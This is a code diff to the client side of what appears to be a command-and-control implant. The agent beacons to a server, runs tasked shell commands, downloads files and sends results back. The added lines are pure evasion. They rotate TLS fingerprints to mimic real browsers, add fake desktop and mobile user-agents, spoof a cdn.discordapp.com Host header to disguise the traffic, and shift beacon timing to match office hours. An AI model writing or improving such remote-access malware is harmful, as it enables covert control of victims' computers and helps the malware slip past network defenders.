@@ -1,12 +1,14 @@
 ## AGENT SİDE
+import datetime
 import json
 import time
 import uuid
 import random
+from wsgiref import headers
+
 import requests
 import subprocess
-
-from urllib3.util import url
+import tls_client
 
 from Encryption import encrypt_data
 
@@ -20,15 +22,50 @@ SLEEP_MAX= 30
 #Generate a unique id for this target
 AGENT_ID = str(uuid.uuid4())
 
+client_identifier_random = [
+    "chrome_112", "chrome_113", "chrome_114",
+    "edge_112", "edge_113",
+    "firefox_115", "firefox_116"
+]
+
+
+#Real like TLS
+client_id = random.choice(client_identifier_random)
+session = tls_client.Session(client_id) # sabit kalmamalı dikkat
+
+
+
 #Fake user-agents to blend into normal traffic
 USER_AGENTS = [
+    # Desktop
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/115.0.0.0",
+
+    # Mobile
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
 ]
+
+
+
+def dynamic_sleep():
+    current_hour = datetime.datetime.now().hour
+
+    if 9 <= current_hour <= 17: #Work Hours
+        return random.randint(SLEEP_MIN, SLEEP_MAX)
+    else: #Nights/Weekends
+        return random.randint(SLEEP_MIN * 2 ,SLEEP_MAX * 3)
+
+
+
+
 
 def beacon():
     headers = {
+        "Host": "cdn.discordapp.com",
         "User-Agent": random.choice(USER_AGENTS),
         "Authorization": f"Bearer {AGENT_ID}",
         "X-Session": str(uuid.uuid4())
@@ -36,8 +73,15 @@ def beacon():
 
     payload = {"id": AGENT_ID}
     encrypted_payload = encrypt_data(json.dumps(payload))
+
     try:
-        response = requests.post(SERVER_URL+BEACON_ENDPOINT, json={"data":encrypted_payload}, headers=headers)
+        response = session.post(
+            SERVER_URL + BEACON_ENDPOINT,
+            json = {"data": encrypted_payload},
+            headers=headers,
+            timeout=10
+        )
+      #  response = requests.post(SERVER_URL+BEACON_ENDPOINT, json={"data":encrypted_payload}, headers=headers)
         if response.status_code != 200:
             data = response.json()
             task = data.get('task')
@@ -65,14 +109,13 @@ def execute_task(task):
     else:
         print(f"[!] Unknown task type : {task_type}")
 
-
-
 def run_shell(command):
     try:
         result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
         post_result(result.decode()) # byte -> string
     except subprocess.CalledProcessError as e:
         post_result(e.output.decode())
+
 
 def download_file(url, save_as):
     try:
@@ -101,11 +144,12 @@ def post_result(result):
     except Exception as e:
         print(f"[!] Result posting error : {e}")
 
+
+
 def main():
     while True:
         beacon()
-        sleep_time = random.uniform(SLEEP_MIN, SLEEP_MAX)
-        time.sleep(sleep_time)
+        time.sleep(dynamic_sleep())
 
 
 
